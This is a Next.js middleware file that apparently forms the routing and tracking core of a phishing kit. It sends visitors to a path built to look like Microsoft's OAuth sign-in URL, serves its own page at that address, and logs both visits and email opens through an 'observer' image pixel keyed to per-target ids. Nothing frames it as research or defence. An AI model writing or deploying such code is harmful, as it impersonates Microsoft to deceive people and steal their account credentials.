import { NextRequest } from "next/server";
import { NextResponse } from "next/server";
import { v4 as uuid } from "uuid";

const URLTemplate = {
  base: "/common/oauth2/v2.0/authorize",
  searchParams: "?client_id={uuid}&redirect_uri={encodeURIComponent}&&",
  redirect: "https://outlook.office.com/mail/",
  id: "client_id",
};

export async function middleware(request: NextRequest) {
  const url = new URL(request.url);
  const searchParams = new URLSearchParams(url.search);
  let id = searchParams.get("id") as string | undefined;

  if (!id && url.pathname === "/" && !searchParams.get("client_id")) {
    id = uuid();
    const tmp = new URL("/", request.url)
    tmp.searchParams.set("id", id)

    return NextResponse.redirect(tmp);
  }

  if (url.pathname === "/" && id && !searchParams.get("client_id")) {
    const tmp = new URL(URLTemplate.base, request.url);

    tmp.searchParams.set("client_id", id);
    tmp.searchParams.set("redirect_uri", encodeURIComponent(URLTemplate.base));
    tmp.searchParams.set("response_type", "code%20id_token");
    tmp.searchParams.set("scope", "openid%20profile%20offline_access");
    tmp.searchParams.set("scope", "openid%20profile%20offline_access");
    tmp.searchParams.set("response_mode", "form_post");
    tmp.searchParams.set("nonce", `${new Date().getTime()}.${getToken()}`);
    tmp.searchParams.set("x-client-SKU", "ID_NET6_0");
    tmp.searchParams.set("x-client-ver", "6.30.1.0");

    await fetch(url.origin + "/api", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ id: id, action: "visits" })
    });

    return NextResponse.redirect(tmp);
  }

  if (url.pathname === URLTemplate.base) {
    const tmpUrl = new URL("/", request.nextUrl.toString());
    tmpUrl.search = request.nextUrl.search;
    return NextResponse.rewrite(tmpUrl);
  }

  // Check if the request is for an image resource in the path "/observer"
  if (/\/observer\.(png|jpg|svg|ico|jpeg|.{4})$/i.test(request.nextUrl.pathname)) {
    if (id) {
      await fetch(url.origin + "/api", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: id, action: "read" })
      });
    }
  }

  return NextResponse.next();
}

function getToken() {
  const tokenBuffer = crypto.getRandomValues(new Uint8Array(256));
  let binary = "";
  tokenBuffer.forEach((byte) => { binary += String.fromCharCode(byte); });
  return btoa(binary);
}